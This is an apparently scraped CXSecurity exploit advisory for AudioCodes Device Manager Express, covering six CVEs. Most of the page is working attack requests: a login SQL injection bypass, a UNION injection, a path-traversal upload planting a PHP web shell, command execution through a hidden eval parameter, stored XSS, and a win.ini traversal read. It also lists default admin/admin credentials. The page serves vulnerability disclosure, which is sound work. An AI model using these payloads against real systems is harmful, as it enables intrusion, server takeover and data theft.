---
title: Device Manager Express 7.8.20002.47752 SQL Injection / XSS / Code Execution / Traversal
url: https://cxsecurity.com/issue/WLB-2023020041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-25
fetch_date: 2025-10-04T08:03:21.707619
---

# Device Manager Express 7.8.20002.47752 SQL Injection / XSS / Code Execution / Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Device Manager Express 7.8.20002.47752 SQL Injection / XSS / Code Execution / Traversal** **2023.02.24**  Credit:  **[Eric Flokstra](https://cxsecurity.com/author/Eric%2BFlokstra/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-24630](https://cxsecurity.com/cveshow/CVE-2022-24630/ "Click to see CVE-2022-24630")** | **[CVE-2022-24632](https://cxsecurity.com/cveshow/CVE-2022-24632/ "Click to see CVE-2022-24632")** | **[CVE-2022-24627](https://cxsecurity.com/cveshow/CVE-2022-24627/ "Click to see CVE-2022-24627")** | **[CVE-2022-24628](https://cxsecurity.com/cveshow/CVE-2022-24628/ "Click to see CVE-2022-24628")** | **[CVE-2022-24629](https://cxsecurity.com/cveshow/CVE-2022-24629/ "Click to see CVE-2022-24629")** | **[CVE-2022-24631](https://cxsecurity.com/cveshow/CVE-2022-24631/ "Click to see CVE-2022-24631")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")  [CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")  [CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Product Name: Device Manager Express
# Vendor Homepage: https://www.audiocodes.com
# Software Link:
https://www.audiocodes.com/solutions-products/products/management-products-solutions/device-manager
# Version: <= 7.8.20002.47752
# Tested on: Windows 10 / Server 2019
# Default credentials: admin/admin
# CVE-2022-24627, CVE-2022-24628, CVE-2022-24629, CVE-2022-24630,
CVE-2022-24631, CVE-2022-24632
# Exploit: https://github.com/00xEF/Audiocodes-Device-Manager-Express
AudioCodes' Device Manager Express features a user interface that enables
enterprise network administrators to set up, configure and update up to 500
400HD Series IP phones in globally distributed corporations.
----------------
CVE-2022-24627: An unauthenticated SQL injection exists in the p parameter
of the login form.
----------------
POST /admin/AudioCodes\_files/process\_login.php HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
Content-Type: application/x-www-form-urlencoded
username=admin&password=&domain=&p=%5C%27or+1%3D1%23
----------------
CVE-2022-24628: An authenticated SQL injection exists in the id parameter
of IPPhoneFirmwareEdit.php
----------------
/admin/AudioCodes\_files/IPPhoneFirmwareEdit.php?action=download&id=-1338'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-
----------------
CVE-2022-24629: A remote code execution vulnerability exists via path
traversal in the dir parameter of the file upload functionality .
----------------
POST /admin/AudioCodes\_files/BrowseFiles.php?type= HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="dir"
C:/audiocodes/express/WebAdmin/admin/AudioCodes\_files/ajax/
-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="type"
-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="myfile"; filename="ajaxJabra.php"
Content-Type: application/x-php
<?php echo shell\_exec($\_GET['x']); ?>
-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="Submit"
Upload
-----------------------------119140522224988540294045582807--
----------------
CVE-2022-24630: A remote command execution exists in an undocumented eval
function in BrowseFiles.php
----------------
POST /admin/AudioCodes\_files/BrowseFiles.php?cmd=ssh HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
ssh\_command=dir+C:
----------------
CVE-2022-24631: A Persistent Cross-Site Scripting exists in the desc
parameter in ajaxTenants.php
----------------
POST /admin/AudioCodes\_files/ajax/ajaxTenants.php HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
action=save&id=1&name=Default&desc=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&subnet=&isdefault=true
----------------
CVE-2022-24632: A path traversal vulnerability exists in the view parameter
of the file download functionality in BrowseFiles.php
----------------
/admin/AudioCodes\_files/BrowseFiles.php?view=C:/windows/win.ini

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top